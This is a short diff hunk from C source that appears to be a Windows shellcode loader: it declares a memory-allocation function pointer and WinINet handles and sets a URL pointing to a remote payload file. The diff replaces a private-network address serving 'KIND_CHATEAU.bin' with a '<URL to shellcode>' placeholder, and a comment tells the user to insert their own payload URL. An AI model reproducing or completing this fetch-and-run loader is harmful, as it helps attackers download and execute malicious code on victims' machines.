@@ -19,7 +19,7 @@ typedef LPVOID (WINAPI* vaex)(
 int main(){
 
     if(1==1){
-        const char *url = "http://192.168.147.128:8080/KIND_CHATEAU.bin"; // Replace with your URL to payload
+        const char *url = "<URL to shellcode>"; // Replace with your URL to payload
         HINTERNET hInternet = NULL, hUrlFile = NULL;
         BYTE buffer[1024];
         DWORD bytesRead;
